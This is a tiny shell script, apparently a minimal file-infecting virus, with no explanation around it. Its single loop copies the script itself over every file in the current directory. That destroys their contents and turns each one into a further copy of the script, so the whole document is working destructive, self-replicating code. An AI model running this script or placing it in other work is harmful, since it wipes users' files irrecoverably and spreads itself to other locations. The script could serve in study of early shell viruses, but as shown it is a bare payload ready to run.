#!/bin/sh
for F in *
do
  cp $0 $F
done
